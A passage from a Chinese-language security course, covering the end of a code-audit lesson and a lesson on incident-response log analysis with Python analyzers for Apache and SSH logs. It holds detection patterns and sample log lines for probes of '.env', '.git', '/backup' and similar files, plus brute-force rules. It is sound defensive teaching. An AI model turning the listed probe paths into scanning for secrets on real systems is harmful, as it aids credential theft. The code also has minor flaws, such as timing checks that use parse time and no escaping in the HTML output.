    print("\n演示文件审计完成，报告已生成: audit_demo_report.html")

def main():
    """主函数"""
    run_audit_demo()
    
    # 演示Web应用审计
    print("\n" + "="*50)
    print("Web应用审计模式")
    
    flask_risks = WebAppAuditor.audit_web_app('flask')
    print("\nFlask常见安全风险:")
    for pattern, desc in flask_risks:
        print(f"  - {desc}: {pattern[:50]}...")

if __name__ == "__main__":
    main()

讲解要点：
代码审计分为静态分析（模式匹配）和动态分析（AST分析）
危险函数调用是重点关注对象
硬编码凭证是最常见的问题
审计报告应包含漏洞定位和修复建议

课后任务：对现有项目代码进行安全审计，编写审计报告。



第三周：应急响应基础（第9-12课）

第9课：应急响应基础与日志分析

前置知识：第8课（代码审计）
下一课衔接：第10课（主机取证）

知识点
应急响应流程（PICERL模型）
日志类型与收集
日志分析工具
时间线构建

代码练习9：日志分析系统


"""
log_analysis_system.py
功能：应急响应日志分析系统
"""

import re
import os
import gzip
import json
import time
from datetime import datetime, timedelta
from collections import defaultdict, Counter
import ipaddress

class LogAnalyzer:
    """日志分析器基类"""
    
    def __init__(self):
        self.events = []
        self.anomalies = []
    
    def parse_log_line(self, line):
        """解析单行日志（子类实现）"""
        raise NotImplementedError
    
    def analyze(self):
        """执行分析（子类实现）"""
        raise NotImplementedError

class ApacheLogAnalyzer(LogAnalyzer):
    """Apache访问日志分析器"""
    
    # Apache日志格式正则
    LOG_PATTERN = re.compile(
        r'(?P<ip>\d+\.\d+\.\d+\.\d+) - - \[(?P<time>[^\]]+)\] "(?P<method>\w+) (?P<path>[^?]+)(?:\?(?P<query>[^ ]+))? [^"]*" (?P<status>\d+) (?P<size>\d+)'
    )
    
    # 可疑状态码
    SUSPICIOUS_STATUS = [404, 403, 500, 502, 503]
    
    # 敏感路径
    SENSITIVE_PATHS = ['/admin', '/config', '/backup', '.git', '.env', '/phpmyadmin']
    
    def __init__(self, log_file):
        super().__init__()
        self.log_file = log_file
        self.ip_stats = Counter()
        self.status_stats = Counter()
        self.path_stats = Counter()
        self.suspicious_activities = []
    
    def parse_log_line(self, line):
        """解析单行日志"""
        match = self.LOG_PATTERN.search(line)
        if match:
            return match.groupdict()
        return None
    
    def analyze(self):
        """分析日志"""
        print(f"正在分析日志: {self.log_file}")
        
        # 处理压缩日志
        if self.log_file.endswith('.gz'):
            open_func = gzip.open
        else:
            open_func = open
        
        with open_func(self.log_file, 'rt', errors='ignore') as f:
            for line_num, line in enumerate(f, 1):
                parsed = self.parse_log_line(line)
                if not parsed:
                    continue
                
                # 统计
                ip = parsed['ip']
                status = int(parsed['status'])
                path = parsed['path']
                
                self.ip_stats[ip] += 1
                self.status_stats[status] += 1
                self.path_stats[path] += 1
                
                # 检测异常
                self.detect_anomaly(parsed, line_num)
                
                self.events.append(parsed)
        
        self.generate_report()
    
    def detect_anomaly(self, parsed, line_num):
        """检测异常行为"""
        ip = parsed['ip']
        status = int(parsed['status'])
        path = parsed['path']
        
        # 1. 404错误过多（扫描行为）
        if status == 404:
            if self.ip_stats[ip] > 20:
                self.anomalies.append({
                    'type': 'web_scan',
                    'ip': ip,
                    'count': self.ip_stats[ip],
                    'line': line_num,
                    'detail': f"IP {ip} 产生 {self.ip_stats[ip]} 个404错误"
                })
        
        # 2. 敏感路径访问
        for sensitive in self.SENSITIVE_PATHS:
            if sensitive in path.lower():
                self.anomalies.append({
                    'type': 'sensitive_access',
                    'ip': ip,
                    'path': path,
                    'line': line_num,
                    'detail': f"IP {ip} 访问敏感路径: {path}"
                })
        
        # 3. 暴力破解检测（大量POST请求）
        if parsed['method'] == 'POST' and '/login' in path:
            if self.ip_stats[ip] > 50:
                self.anomalies.append({
                    'type': 'bruteforce',
                    'ip': ip,
                    'count': self.ip_stats[ip],
                    'line': line_num,
                    'detail': f"IP {ip} 发送 {self.ip_stats[ip]} 个POST请求到登录页面"
                })
    
    def generate_report(self):
        """生成分析报告"""
        print("\n" + "="*50)
        print("Apache日志分析报告")
        print("="*50)
        
        print(f"总请求数: {len(self.events)}")
        print(f"唯一IP数: {len(self.ip_stats)}")
        
        print("\n状态码统计:")
        for status, count in self.status_stats.most_common(10):
            print(f"  {status}: {count}")
        
        print("\n最常访问的路径:")
        for path, count in self.path_stats.most_common(10):
            print(f"  {path[:50]}: {count}")
        
        print(f"\n发现 {len(self.anomalies)} 个异常:")
        for anomaly in self.anomalies[:20]:
            print(f"  [{anomaly['type']}] {anomaly['detail']}")

class SSHAuthLogAnalyzer(LogAnalyzer):
    """SSH认证日志分析器"""
    
    # SSH日志模式
    FAILED_PATTERN = re.compile(r'Failed password for (?:invalid user )?(\w+) from (\d+\.\d+\.\d+\.\d+) port \d+')
    ACCEPTED_PATTERN = re.compile(r'Accepted password for (\w+) from (\d+\.\d+\.\d+\.\d+)')
    
    def __init__(self, log_file='/var/log/auth.log'):
        super().__init__()
        self.log_file = log_file
        self.failed_attempts = defaultdict(list)
        self.successful_logins = []
        self.suspicious_ips = set()
    
    def analyze(self):
        """分析SSH日志"""
        print(f"正在分析SSH日志: {self.log_file}")
        
        try:
            with open(self.log_file, 'r', errors='ignore') as f:
                for line in f:
                    # 检测失败登录
                    failed_match = self.FAILED_PATTERN.search(line)
                    if failed_match:
                        username, ip = failed_match.groups()
                        self.failed_attempts[ip].append({
                            'username': username,
                            'time': time.time()
                        })
                        continue
                    
                    # 检测成功登录
                    accepted_match = self.ACCEPTED_PATTERN.search(line)
                    if accepted_match:
                        username, ip = accepted_match.groups()
                        self.successful_logins.append({
                            'username': username,
                            'ip': ip,
                            'time': time.time()
                        })
        except FileNotFoundError:
            print(f"日志文件不存在: {self.log_file}")
            return
        
        self.detect_bruteforce()
        self.detect_successful_attack()
    
    def detect_bruteforce(self, threshold=10, time_window=60):
        """检测暴力破解"""
        for ip, attempts in self.failed_attempts.items():
            if len(attempts) >= threshold:
                # 检查时间窗口内尝试次数
                window_attempts = [a for a in attempts 
                                  if time.time() - a['time'] < time_window]
                if len(window_attempts) >= threshold:
                    self.anomalies.append({
                        'type': 'ssh_bruteforce',
                        'ip': ip,
                        'attempts': len(attempts),
                        'unique_usernames': len(set(a['username'] for a in attempts)),
                        'detail': f"IP {ip} 在{time_window}秒内尝试{len(window_attempts)}次登录"
                    })
                    self.suspicious_ips.add(ip)
    
    def detect_successful_attack(self):
        """检测成功的攻击（爆破后成功登录）"""
        for success in self.successful_logins:
            ip = success['ip']
            if ip in self.suspicious_ips:
                self.anomalies.append({
                    'type': 'successful_attack',
                    'ip': ip,
                    'username': success['username'],
                    'detail': f"可疑IP {ip} 成功登录用户 {success['username']}"
                })
    
    def generate_report(self):
        """生成报告"""
        print("\n" + "="*50)
        print("SSH认证日志分析报告")
        print("="*50)
        
        print(f"失败尝试总数: {sum(len(v) for v in self.failed_attempts.values())}")
        print(f"成功登录数: {len(self.successful_logins)}")
        print(f"可疑IP数: {len(self.suspicious_ips)}")
        
        print(f"\n发现 {len(self.anomalies)} 个异常:")
        for anomaly in self.anomalies[:20]:
            print(f"  [{anomaly['type']}] {anomaly['detail']}")
        
        # 建议封禁的IP
        if self.suspicious_ips:
            print("\n建议封禁的IP:")
            for ip in list(self.suspicious_ips)[:10]:
                print(f"  iptables -A INPUT -s {ip} -j DROP")

class TimelineBuilder:
    """时间线构建器"""
    
    def __init__(self):
        self.events = []
    
    def add_event(self, timestamp, source, event_type, details):
        """添加事件"""
        self.events.append({
            'timestamp': timestamp,
            'source': source,
            'type': event_type,
            'details': details
        })
    
    def build_timeline(self):
        """构建时间线"""
        self.events.sort(key=lambda x: x['timestamp'])
        return self.events
    
    def generate_html_timeline(self, output_file='timeline.html'):
        """生成HTML时间线"""
        timeline = self.build_timeline()
        
        html = '''
        <!DOCTYPE html>
        <html>
        <head>
            <title>应急响应时间线</title>
            <style>
                body { font-family: monospace; margin: 20px; }
                .event { border-left: 3px solid #333; padding: 10px; margin: 10px 0; }
                .time { color: #666; font-size: 0.9em; }
                .type { font-weight: bold; }
                .critical { border-left-color: red; }
                .warning { border-left-color: orange; }
                .info { border-left-color: blue; }
            </style>
        </head>
        <body>
            <h1>应急响应时间线</h1>
        '''
        
        for event in timeline:
            severity_class = 'info'
            if 'attack' in event['type'] or 'exploit' in event['type']:
                severity_class = 'critical'
            elif 'anomaly' in event['type'] or 'suspicious' in event['type']:
                severity_class = 'warning'
            
            html += f'''
            <div class="event {severity_class}">
                <div class="time">{event['timestamp']}</div>
                <div class="type">[{event['source']}] {event['type']}</div>
                <div>{json.dumps(event['details'], ensure_ascii=False)}</div>
            </div>
            '''
        
        html += '''
        </body>
        </html>
        '''
        
        with open(output_file, 'w', encoding='utf-8') as f:
            f.write(html)
        print(f"时间线已生成: {output_file}")

def main():
    """主函数"""
    # 演示Apache日志分析
    print("="*50)
    print("应急响应日志分析系统演示")
    
    # 创建示例日志
    sample_log = """
192.168.1.100 - - [10/May/2024:13:55:36 +0000] "GET /index.html HTTP/1.1" 200 1024
192.168.1.100 - - [10/May/2024:13:55:37 +0000] "GET /admin/login.php HTTP/1.1" 404 512
192.168.1.100 - - [10/May/2024:13:55:38 +0000] "POST /login.php HTTP/1.1" 200 256
203.0.113.45 - - [10/May/2024:13:56:00 +0000] "GET /.env HTTP/1.1" 404 128
203.0.113.45 - - [10/May/2024:13:56:01 +0000] "GET /config.php HTTP/1.1" 404 128
203.0.113.45 - - [10/May/2024:13:56:02 +0000] "GET /backup.zip HTTP/1.1" 404 128
"""
    
    with open('sample_access.log', 'w') as f:
        f.write(sample_log)
    
    # 分析日志
    analyzer = ApacheLogAnalyzer('sample_access.log')
    analyzer.analyze()
    
    # 构建时间线
    timeline = TimelineBuilder()
    timeline.add_event(datetime.now(), 'Apache', 'web_request', {'ip': '192.168.1.100', 'path': '/index.html'})
    timeline.add_event(datetime.now(), 'IDS', 'suspicious_scan', {'ip': '203.0.113.45', 'target': '/.env'})
    timeline.generate_html_timeline()
    
    # 清理
    os.remove('sample_access.log')

if __name__ == "__main__":
    main()

讲解要点：
应急响应流程：准备→检测→抑制→消除→恢复→总结
日志分析是关键的第一步，需建立时间线
关注失败尝试、异常路径、高频访问等模式
可疑IP应快速封堵

课后任务：分析真实攻击日志，重建攻击时间线。


